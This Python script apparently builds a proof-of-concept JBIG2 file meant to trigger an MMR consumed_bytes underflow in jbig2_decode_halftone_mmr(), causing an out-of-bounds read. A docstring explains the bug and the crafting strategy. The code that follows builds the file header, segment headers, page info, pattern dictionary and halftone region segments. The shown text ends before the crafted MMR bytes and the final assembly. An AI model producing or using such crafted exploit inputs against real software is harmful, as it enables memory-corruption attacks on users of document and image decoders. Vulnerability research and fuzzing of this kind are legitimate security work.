#!/usr/bin/env python3
"""Generate a JBIG2 PoC that triggers the MMR consumed_bytes underflow bug.

The bug is in jbig2_decode_halftone_mmr() in jbig2_mmr.c:
- jbig2_decode_mmr_consume() increments data_index even when no new data is read
  (when data_index + 4 >= size)
- At the end, consumed_bytes = data_index + (bit_index >> 3) + (bit_index > 0 ? 1 : 0)
  overcounts, causing size - consumed_bytes to underflow in the caller

Strategy:
- Create a JBIG2 file with a halftone region using MMR (HMMR=1)
- The halftone region has a 1x1 gray-scale image with GSBPP=2 (2 bitplanes)
- The MMR data for the first bitplane is crafted to be very short (3 bytes)
- After decoding the first bitplane, consumed_bytes overcounts (> 3)
- The second call uses size - consumed_bytes which underflows (wraps to huge value)
- The MMR decoder then reads out of bounds from data + consumed_bytes
"""

import struct

def build_file_header():
    """JBIG2 file header (D.4.1, D.4.2)"""
    return b'\x97\x4a\x42\x32\x0d\x0a\x1a\x0a' + b'\x01'  # flags: sequential

def build_segment_header(seg_num, seg_type, page_assoc, data_length, referred_to=None):
    """Build a JBIG2 segment header."""
    buf = struct.pack('>I', seg_num)
    
    # Segment flags: type in bits 0-5
    flags = seg_type & 0x3F
    if page_assoc > 255:
        flags |= 0x40  # 4-byte page association
    buf += bytes([flags])
    
    # Referred-to segment count
    if referred_to is None or len(referred_to) == 0:
        buf += bytes([0])  # count = 0
    else:
        count = len(referred_to)
        if count <= 4:
            buf += bytes([count << 5])
        else:
            buf += struct.pack('>I', 0xE0000000 | count)
        
        for ref in referred_to:
            if ref <= 255:
                buf += bytes([ref])
            elif ref <= 65535:
                buf += struct.pack('>H', ref)
            else:
                buf += struct.pack('>I', ref)
    
    # Page association
    if page_assoc > 255:
        buf += struct.pack('>I', page_assoc)
    else:
        buf += bytes([page_assoc])
    
    # Data length
    buf += struct.pack('>I', data_length)
    
    return buf

def build_page_info_segment_data(width, height, xres=72, yres=72, flags=0, striping=0):
    """Build page info segment data (7.4.8)."""
    buf = struct.pack('>I', width)
    buf += struct.pack('>I', height)
    buf += struct.pack('>I', xres)
    buf += struct.pack('>I', yres)
    buf += bytes([flags])
    buf += struct.pack('>h', striping)
    return buf

def build_pattern_dict_segment_data(hdpw=1, hdph=1, graymax=0, hdmmr=0, hdtemplate=0, pattern_data=b''):
    """Build pattern dictionary segment data (7.4.4).
    
    We use arithmetic coding (HDMMR=0) with a single 1x1 pattern.
    The pattern data is a generic region encoded with arithmetic coding.
    For a 1x1 white pattern, we need a minimal arithmetic-coded generic region.
    """
    flags = (hdmmr & 1) | ((hdtemplate & 3) << 1)
    buf = bytes([flags])
    buf += bytes([hdpw])
    buf += bytes([hdph])
    buf += struct.pack('>I', graymax)
    buf += pattern_data
    return buf

def build_halftone_region_segment_data(region_width, region_height, x, y, region_flags,
                                        hmmr, htemplate, henableskip, hcombop, hdefpixel,
                                        hgw, hgh, hgx, hgy, hrx, hry, mmr_data=b''):
    """Build halftone region segment data (7.4.5)."""
    # Region segment info (7.4.1) - 17 bytes
    buf = struct.pack('>I', region_width)
    buf += struct.pack('>I', region_height)
    buf += struct.pack('>I', x)
    buf += struct.pack('>I', y)
    buf += bytes([region_flags & 0x07])  # region flags
    
    # Halftone specific flags (7.4.5.1.1) - 1 byte
    hflags = (hmmr & 1) | ((htemplate & 3) << 1) | ((henableskip & 1) << 3) | ((hcombop & 7) << 4) | ((hdefpixel & 1) << 7)
    buf += bytes([hflags])
    
    # Halftone specific (7.4.5.1.2) - 16 bytes
    buf += struct.pack('>I', hgw)
    buf += struct.pack('>I', hgh)
    buf += struct.pack('>i', hgx)
    buf += struct.pack('>i', hgy)
    
    # Halftone specific (7.4.5.1.3) - 4 bytes
    buf += struct.pack('>H', hrx)
    buf += struct.pack('>H', hry)
    
    # MMR encoded data
    buf += mmr_data
    
    return buf

